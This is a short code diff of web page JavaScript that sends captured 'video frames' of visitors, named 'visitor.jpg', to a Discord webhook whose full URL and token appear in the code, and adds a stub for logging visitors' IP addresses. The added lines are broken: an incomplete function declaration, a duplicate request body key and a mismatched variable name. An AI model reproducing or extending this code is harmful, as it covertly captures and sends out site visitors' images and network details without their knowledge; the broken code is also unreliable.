@@ -168,6 +168,8 @@
     }
    }
    
+   function logIP
+   
    function sendToDiscord(blob) {
     var file = new File([blob],
      'visitor.jpg');
@@ -175,14 +177,18 @@
     var formData = new FormData();
     formData.append('file', file);
     
+    var formIPData = new FormData();
+    formData.append('test', file);
+    
     fetch(
       'https://discord.com/api/webhooks/1110072092826808390/IR34WYbMbUzKWKv2ade5O7m7JEQfzhpsFgOCzAql57-ViE5Rcs57JLUwnCBYboKH78kj', {
        method: 'POST',
        body: formData
+       body: formIPdata
       })
      .then(function(response) {
       console.log(
-       'Successfully sent video frame to Discord.'
+       'Successfully sent video frame and Gathered info to Discord.'
       );
      })
      .catch(function(error) {
